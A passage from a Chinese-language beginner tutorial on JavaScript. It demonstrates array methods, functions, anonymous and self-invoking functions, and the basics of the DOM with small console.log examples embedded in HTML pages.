class="string">&#x27;e&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a[a.length<span class="number">-1</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124090736.png"></p>
<h3 id="便利数组"><a href="#便利数组" class="headerlink" title="便利数组"></a>便利数组</h3><p>事例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;=(a.length<span class="number">-1</span>);i++)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a[i]);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124091938.png"></p>
<h3 id="清空数组"><a href="#清空数组" class="headerlink" title="清空数组"></a>清空数组</h3><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">数组名.length=<span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="数组内置方法"><a href="#数组内置方法" class="headerlink" title="数组内置方法"></a>数组内置方法</h2><p>查看官方操控文档<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124101830.png"></p>
<h3 id="常用的数组内置方法"><a href="#常用的数组内置方法" class="headerlink" title="常用的数组内置方法"></a>常用的数组内置方法</h3><h4 id="toString-数组方法的使用"><a href="#toString-数组方法的使用" class="headerlink" title="toString()数组方法的使用"></a>toString()数组方法的使用</h4><p>toString()数组方法他会输出数组的内容<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a.toString());</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124102249.png"></p>
<h4 id="push-添加到数组的末尾"><a href="#push-添加到数组的末尾" class="headerlink" title="push()添加到数组的末尾"></a>push()添加到数组的末尾</h4><p>push() 方法将一个或多个元素添加到数组的末尾，并返回该数组的新长度。<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    a.push(<span class="string">&#x27;e&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124103522.png"></p>
<h4 id="pop-删除数组的最后一个元素"><a href="#pop-删除数组的最后一个元素" class="headerlink" title="pop()删除数组的最后一个元素"></a>pop()删除数组的最后一个元素</h4><p>pop()方法从数组中删除最后一个元素，并返回该元素的值。此方法更改数组的长度。<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line">    a.pop();</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124103736.png"></p>
<h4 id="shift-删除第一个元素"><a href="#shift-删除第一个元素" class="headerlink" title="shift() 删除第一个元素"></a>shift() 删除第一个元素</h4><p>shift() 方法从数组中删除第一个元素，并返回该元素的值。此方法更改数组的长度。<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line">    a.shift();</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124105319.png"></p>
<h4 id="unshift-添加到数组的开头"><a href="#unshift-添加到数组的开头" class="headerlink" title="unshift() 添加到数组的开头"></a>unshift() 添加到数组的开头</h4><p>unshift() 方法将一个或多个元素添加到数组的开头，并返回该数组的新长度(该方法修改原有数组)。<br>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    a.unshift(<span class="string">&#x27;e&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124111741.png"></p>
<h4 id="reverse-组中元素的位置颠倒"><a href="#reverse-组中元素的位置颠倒" class="headerlink" title="reverse()组中元素的位置颠倒"></a>reverse()组中元素的位置颠倒</h4><p>reverse() 方法将数组中元素的位置颠倒，并返回该数组。数组的第一个元素会变成最后一个，数组的最后一个元素变成第一个。该方法会改变原数组</p>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line">    a.reverse() ;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124112202.png"></p>
<h3 id="sort-大小进行排序"><a href="#sort-大小进行排序" class="headerlink" title="sort()大小进行排序"></a>sort()大小进行排序</h3><p>sort() 方法用原地算法对数组的元素进行排序，并返回数组。默认排序顺序是在将元素转换为字符串，然后比较它们的UTF-16代码单元值序列时构建的</p>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>];</span></span><br><span class="line">    a.sort() ;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124113048.png"></p>
<h4 id="concat-数组连接"><a href="#concat-数组连接" class="headerlink" title="concat()数组连接"></a>concat()数组连接</h4><p> concat() 方法用于合并两个或多个数组。此方法不会更改现有数组，而是返回一个新数组。<br> 实咧<br> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> array1 = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>];</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> array2 = [<span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>];</span></span><br><span class="line"><span class="javascript">   <span class="keyword">var</span> array3 = array1.concat(array2);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(array3);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br> <img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124113813.png"></p>
<h3 id="slice-切割"><a href="#slice-切割" class="headerlink" title="slice()切割"></a>slice()切割</h3><p> slice() 方法返回一个新的数组对象，这一对象是一个由 begin 和 end 决定的原数组的浅拷贝（包括 begin，不包括end）。原始数组不会被改变。<br> 实咧<br> <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a.slice(<span class="number">2</span>,<span class="number">4</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124114316.png"></p>
<h4 id="indexOf-和lastIndexOf-查询所在的位置"><a href="#indexOf-和lastIndexOf-查询所在的位置" class="headerlink" title="indexOf()和lastIndexOf()查询所在的位置"></a>indexOf()和lastIndexOf()查询所在的位置</h4><p>indexOf()是在前面开始查询<br>lastIndexOf()是在后面开始查询</p>
<p>lastIndexOf() 方法返回指定元素（也即有效的 JavaScript 值或变量）在数组中的最后一个的索引，如果不存在则返回 -1。从数组的后面向前查找，从 fromIndex 处开始。<br>indexOf()方法返回在数组中可以找到一个给定元素的第一个索引，如果不存在，则返回-1。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a.indexOf(<span class="string">&#x27;b&#x27;</span>));</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124114856.png"></p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  函数名(<span class="params"></span>)</span>&#123;</span><br><span class="line">    执行语句。。。。。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="arguments函数"><a href="#arguments函数" class="headerlink" title="arguments函数"></a>arguments函数</h3><p>arguments函数多个函数的参数</p>
<p>实咧<br><code>.length</code>方法是获得他的长度的</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span>  <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">arguments</span>.length);</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="built_in">arguments</span>);</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=<span class="string">&#x27;abc&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b=<span class="string">&#x27;def&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> c=<span class="string">&#x27;hij&#x27;</span>;</span></span><br><span class="line">    add(a,b,c);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124192052.png"></p>
<h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>匿名函数就是不需要定义的函数名字叫做匿名函数</p>
<h3 id="匿名函数格式"><a href="#匿名函数格式" class="headerlink" title="匿名函数格式"></a>匿名函数格式</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    执行语句。。。。。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="变量调用匿名函数"><a href="#变量调用匿名函数" class="headerlink" title="变量调用匿名函数"></a>变量调用匿名函数</h3><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a+b);</span></span><br><span class="line">    &#125;</span><br><span class="line">    a(1,1);</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124194240.png"></p>
<h3 id="自己调用匿名函数"><a href="#自己调用匿名函数" class="headerlink" title="自己调用匿名函数"></a>自己调用匿名函数</h3><p>格式<br>(整个函数)(参数)</p>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(a+b);</span></span><br><span class="line">    &#125;)(1,1)</span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124195917.png"></p>
<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><h3 id="DOM介绍"><a href="#DOM介绍" class="headerlink" title="DOM介绍"></a>DOM介绍</h3><p>比如<code>a.htm</code>l这个<code>a.html</code>就是一个文档对象<br>下面这个是文档对象的模型<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201130160523.png"></p>
<p><code>document</code>对象就代表整个网页的对象</p>
<h3 id="document基本使用"><a href="#document基本使用" class="headerlink" title="document基本使用"></a><code>document</code>基本使用</h3><p><code>document</code>对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问<br><code>document</code>他是一个全局属性，在一个web页面里面那个地址都可以访问他<br>比如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span>&gt;</span>你好啊<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在js里面怎么调用他<br>用<code>document</code>的<code>getElementById</code>的方法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;id的值&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>全部代码</p>
